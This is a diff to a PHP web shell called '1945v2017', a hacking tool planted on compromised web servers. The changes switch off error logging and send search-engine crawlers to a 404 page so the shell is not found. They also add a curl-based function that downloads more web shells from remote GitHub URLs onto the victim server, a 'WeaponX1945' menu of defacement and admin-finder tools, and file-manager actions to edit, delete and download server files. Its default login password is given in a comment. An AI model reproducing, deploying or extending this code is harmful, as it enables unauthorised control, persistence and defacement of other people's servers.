@@ -13,11 +13,26 @@ session_start();
 @set_time_limit(0);
 @ini_set('file_uploads',on);
 @ini_set('upload_max_filesize',1000);
-@ini_set('error_log','.error-log-1945.txt'); // save error log , report if any error to : alinkokomansuby@gmail.com
+@ini_set('error_log',NULL); //  report if any error to : alinkokomansuby@gmail.com
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('output_buffering',0);
+@ini_set('display_errors', 0);
+
+// Block Dorking Shell Redirect to 404 Page
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+// End
+
 $passwd_45 		= "fe4530f3758f14e06d97b05f44c9f856"; // default password : indonesianpeople
 $session_name = "_session_1945_v2017";
 $session_45 	= $_SESSION[md5($_SERVER['HTTP_HOST'].$session_name)];
-$image_bg_45 	= "http://wallpapers-best.com/uploads/posts/2015-10/1_indonesia.jpg";
+$image_bg_45 	= "http://wallpapers-best.com/uploads/posts/2015-10/1_indonesia.jpg"; // background image login.
 
 function passwd_45_login($wallpaper) {
 	echo "<html><head><title>".$_SERVER['HTTP_HOST']." - shutdown57 - 1945v2017</title></head><body>";
@@ -39,8 +54,24 @@ if(!isset($session_45)){
         passwd_45_login($image_bg_45);
 }
 }
-
+$arrayku1945 = array(
+					"adminer"	=>	"https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
+					"awesomeware"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/awesome1945.php",
+					"1945v1"	=>	"https://raw.githubusercontent.com/alintamvanz/webshell/master/1945.php",
+					"ayana"	=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ayana.php",
+					"linuxcode" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php",
+					"filename" => array(
+						"adminer"=>"adminer1945.php",
+						"awesomeware"=>"awesome1945.php",
+						"1945v1"=>"1945v1.php",
+						"ayana"=>"ayana1945.php",
+						"linuxcode"=>"linuxcode1945.php",
+						)
+					);
 class Html45{
+	public function backtolo(){
+		echo "<br><br><center><h1>[<a href='?____shutdown57'>Home</a>] [<a href='javascript:history.go(-1);'>Back To History</a>] </h1></center>";
+	}
 	public function modal($head,$konten,$id){
 		echo '<div class="modal"><input id="'.$id.'" type="checkbox" /><label for="'.$id.'" class="overlay"></label><article>
 		    <header><h3>'.$head.'</h3><label for="'.$id.'" class="close">&times;</label></header>
@@ -174,9 +205,9 @@ class FileMan45{
 		$s = @scandir($dir);
 			echo "<tr>";
 			echo "<td colspan='6'>[[ <a href='?_d=".dirname($dir)."'>..</a> ]]</td>";
-			echo "<td><select><option>--New--</option>
-				<option onclick=\"window.location.href='?_o=$dir&_x=nfile'\">NewFile</option>
-				<option onclick=\"window.location.href='?_o=$dir&_x=ndir'\">NewDir</option></select>";
+			echo "<td>
+				<a href='#' onclick=\"window.location.href='?_o=$dir&_x=nfile'\">NewFile</a>
+				<a href='#' onclick=\"window.location.href='?_o=$dir&_x=ndir'\">NewDir</a>";
 			echo "</tr>";
 		foreach($s as $d)
 		{
@@ -189,9 +220,9 @@ class FileMan45{
 			$this->td($this->owngro45("$dir/$d"));
 			$this->td($this->perms45("$dir/$d"));
 			$this->td($this->lmodif45("$dir/$d"));
-			$this->td("<select><option></option>
-				<option onclick=\"window.location.href='?_o=$dir/$d&_x=ren'\">Rename</option>
-				<option onclick=\"window.location.href='?_o=$dir/$d&_x=del'\">Delete</option></select>");
+			$this->td("
+				<a href='#' onclick=\"window.location.href='?_o=$dir/$d&_x=ren'\" title='Rename : $d'>Ren</a>
+				<a href='#' onclick=\"window.location.href='?_o=$dir/$d&_x=del'\" title='Delete : $d'>Del</a>");
 			echo "</tr>";
 		}
 
@@ -205,11 +236,10 @@ class FileMan45{
 			$this->td($this->owngro45("$dir/$f"));
 			$this->td($this->perms45("$dir/$f"));
 			$this->td($this->lmodif45("$dir/$f"));
-			$this->td("<select><option></option>
-				<option onclick=\"window.location.href='?_o=$dir/$f&_x=ren'\">Rename</option>
-				<option onclick=\"window.location.href='?_o=$dir/$f&_x=del'\">Delete</option>
-				<option onclick=\"window.location.href='?_o=$dir/$f&_x=edit'\">Edit</option>
-				<option onclick=\"window.location.href='?_o=$dir/$f&_x=dl'\">Download</option></select>");
+			$this->td("<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=ren'\"  title='Rename : $f'>Ren</a>
+				<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=del'\" title='Delete : $f'>Del</a>
+				<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=edit'\" title='Edit : $f'>Edit</a>
+				<a href='#' onclick=\"window.location.href='?_o=$dir/$f&_x=dl'\" title='Download : $f'>Dl</a>");
 			echo "</tr>";
 		}
 		echo "</table>";
@@ -349,7 +379,32 @@ class Action45{
     }
     return $mkdir;
   }
-
+	public  function kuchiyose45($url,$nama)
+	{
+		if(file_exists($nama)){
+			$res = "<center><h3> File ".$nama." Exists! -> <a href='".$nama."' target='_blank'>".$nama." here?</a></h3>";
+			echo $res;
+		}else{
+		$fp = fopen($nama, "w");
+		$ch = curl_init();
+				curl_setopt($ch, CURLOPT_URL, $url);
+				curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+				curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+					curl_setopt($ch, CURLOPT_FILE, $fp);
+	$res= curl_exec($ch);
+					curl_close($ch);
+		fclose($fp);
+		ob_flush();
+		flush();
+	if($res){
+		echo "<script>alert('Boom boom boom!'); window.open('".$nama."'); </script>";
+	}else{
+		echo "<script>alert('Failed Coeg~'); window.location.href='?____shutdown57';</script>";
+	}
+	}
+	return $res;
+}
 }
 
 
@@ -491,12 +546,22 @@ echo '
 		$html->modal($head,$konten,$id);
 	}
 }
+
+// menentukan directory
 if(isset($_GET['_d']))
 {
 	$d = $_GET['_d'];
+}elseif($_GET['_o']){
+	if(is_file($_GET['_o'])){
+		$d = dirname($_GET['_o']);
+	}else{
+	$d = $_GET['_o'];
+	}
 }else{
-	$d = __DIR__;
+	$d = getcwd();
 }
+
+
 $html = new Html45();
 
 // List Tools
@@ -516,6 +581,10 @@ $weapon.= abtn("?_o=$d&_x=af","Admin Finder Wordlist");
 $weapon.= abtn("?_o=$d&_x=di","Defacer ID");
 $weapon.= abtn("?_o=$d&_x=am","Adminer");
 $weapon.= abtn("?_o=$d&_x=net","Network");
+$weapon.= "<hr><h3> KuchiyoseX1945 </h3><hr>";
+$weapon.= abtn("?_o=$d&_x=1945v1","1945v1 Shell");
+$weapon.= abtn("?_o=$d&_x=lc","linuXcode v2017");
+$weapon.= abtn("?_o=$d&_x=as","AyanaShahab priv8 shell");
 
 $html->modal("WeaponX1945",$weapon,"weapon");
 // End List
@@ -529,6 +598,26 @@ $Head->Tools45($d);
 
 $FileMan = new FileMan45();
 $Head->SecInfo45();
+
+$d=str_replace('\\','/',$d);
+$path = explode('/',$d);
+echo "<b>Directory : </b>";
+foreach($path as $id=>$curdir){
+if($curdir == '' && $id == 0){
+$a = true;
+echo '<a href="?_d=/">/</a>';
+continue;
+}
+if($curdir == '') continue;
+echo '<a href="?_d=';
+for($i=0;$i<=$id;$i++){
+echo "$path[$i]";
+if($i != $id) echo "/";
+}
+echo '">'.$curdir.'</a>/';
+}
+echo "<hr>";
+
 if(!isset($_GET['_o'])){
 
 $FileMan->ScanDir($d);
@@ -644,10 +733,25 @@ if($act->del45($_GET['_o'])){
 }elseif ($x == "I_love_U") {
 	session_destroy();
 	echo "<script> alert('Bye Bye Bye !'); window.location.href='".$_SERVER['PHP_SELF']."'; </script>";
+}elseif ($x == "rw") {
+	$act->kuchiyose45($arrayku1945['awesomeware'],$arrayku1945['filename']['awesomeware']);
+	$html->backtolo();
+}elseif ($x == "1945v1") {
+	$act->kuchiyose45($arrayku1945['1945v1'],$arrayku1945['filename']['1945v1']);
+	$html->backtolo();
+}elseif ($x == "lc") {
+	$act->kuchiyose45($arrayku1945['linuxcode'],$arrayku1945['filename']['linuxcode']);
+	$html->backtolo();
+}elseif ($x == "am") {
+	$act->kuchiyose45($arrayku1945['adminer'],$arrayku1945['filename']['adminer']);
+	$html->backtolo();
+}elseif ($x == "as") {
+	$act->kuchiyose45($arrayku1945['ayana'],$arrayku1945['filename']['ayana']);
+	$html->backtolo();
 }
 }
 
 }
 // footer
-$foot = "copyright &copy; ".date('Y')." <a href='http://www.linuXcode.org' target='_blank'>linuXcode.org</a> - alinko ";
+$foot = "copyright &copy; ".date('Y')." <a href='http://www.linuXcode.org' target='_blank'>linuXcode.org</a> | c0ded by : <a href='https://facebook.com/JKT48.co'>shutdown57 a.k.a alinko</a>";
 $html->footer($foot);
